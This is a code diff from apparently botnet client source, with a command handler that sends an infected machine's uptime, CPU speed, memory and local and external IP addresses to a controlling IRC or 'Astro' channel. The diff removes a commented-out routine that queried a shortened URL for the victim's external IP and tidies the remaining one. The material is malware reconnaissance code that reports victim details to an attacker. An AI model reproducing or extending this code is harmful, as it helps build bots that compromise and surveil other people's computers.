@@ -91,7 +91,7 @@ bool cSystem::HandleCommand(char* cmd, char* params, ...)
 		MEMORYSTATUSEX status2;
 		status2.dwLength = sizeof(status2);
 		GlobalMemoryStatusEx(&status2);
-		
+
 		SYSTEM_INFO si = { 0 };
 		::GetSystemInfo(&si);
 		// allocate buffer to get info for each processor
@@ -126,7 +126,7 @@ bool cSystem::HandleCommand(char* cmd, char* params, ...)
 		g_cVoodoo->m_cAstro.sendmsg("04[15Uptime04]:00 %d Days %d Hours %d Minutes %d Seconds", dwD, dwH, dwM, dwS);
 		g_cVoodoo->m_cAstro.sendmsg("04[15CPU Clock:00 %d15MHz 04/00 %d15GHz04]", ppi->CurrentMhz, (ppi->CurrentMhz / 1000));
 		g_cVoodoo->m_cAstro.sendmsg("04[15Memory04]: [15Total:00 %d15GB04][15Used: 00%d15GB04][Free: 00%d15GB04]", (status2.ullTotalPhys / 1000000000), ((status2.ullTotalPhys / 1000000000) - (status2.ullAvailPhys / 1000000000)), (status2.ullAvailPhys / 1000000000));
-//		g_cVoodoo->m_cAstro.sendmsg("[HDD]: To be Continued");
+		//		g_cVoodoo->m_cAstro.sendmsg("[HDD]: To be Continued");
 #endif
 #ifndef NO_P2P
 		for (int i = 1; i < MAX_CLIENTS; i++)
@@ -155,9 +155,6 @@ bool cSystem::HandleCommand(char* cmd, char* params, ...)
 			}
 		}
 #endif
-#ifndef NO_IRC
-		g_cVoodoo->m_cIRC.sendmsg("[Network]: %s", (char*)NetInfo());
-#endif
 #ifndef NO_ASTRO
 		g_cVoodoo->m_cAstro.sendmsg("04[15Network04]:00 %s", (char*)NetInfo());
 #endif
@@ -166,44 +163,9 @@ bool cSystem::HandleCommand(char* cmd, char* params, ...)
 	return false;
 }
 
-/*
 char* cSystem::NetInfo()
 {
-	static char ninfo[1024];
 	
-	SOCKADDR sa;
-	int sas;
-	sas = sizeof(sa);
-	HINTERNET hInternet, hFile;
-	DWORD rSize;
-	char buffer[32];
-
-	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-	hFile = InternetOpenUrlA(hInternet, "https://tinyurl.com/extip101", NULL, 0, INTERNET_FLAG_RELOAD, 0);
-	if (!InternetReadFile(hFile, &buffer, sizeof(buffer), &rSize)) return NULL;
-	buffer[rSize] = '\0';
-
-	InternetCloseHandle(hFile);
-	InternetCloseHandle(hInternet);
-
-	memset(&sa, 0, sizeof(sa));
-#ifndef NO_IRC
-	getsockname(g_cVoodoo->m_cIRC.m_socket, &sa, &sas);
-#endif
-#ifndef NO_ASTRO
-	getsockname(g_cVoodoo->m_cAstro.m_cSocket.GetSocket(), &sa, &sas);
-#endif
-
-	sprintf_s(ninfo, sizeof(ninfo) - 1, "04[15Local IP: 00%d.%d.%d.%d04] [15External IP:00 %s04]", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5], buffer);
-
-	//sprintf_s(ninfo, sizeof(ninfo) - 1, "test");
-
-	return ninfo;
-
-}*/
-
-char* cSystem::NetInfo()
-{
 	SOCKADDR sa;
 	struct sockaddr_in saip;
 	char str[32];
@@ -230,5 +192,8 @@ char* cSystem::NetInfo()
 	sscanf_s(buffer, "%d.%d.%d.%d", &a, &b, &c, &d);
 
 	sprintf_s(ninfo, sizeof(ninfo) - 1, "%i.%i.%i.%i", a, b, c, d);
+
 	return ninfo;
-}
+	
+	return NULL;
+	}
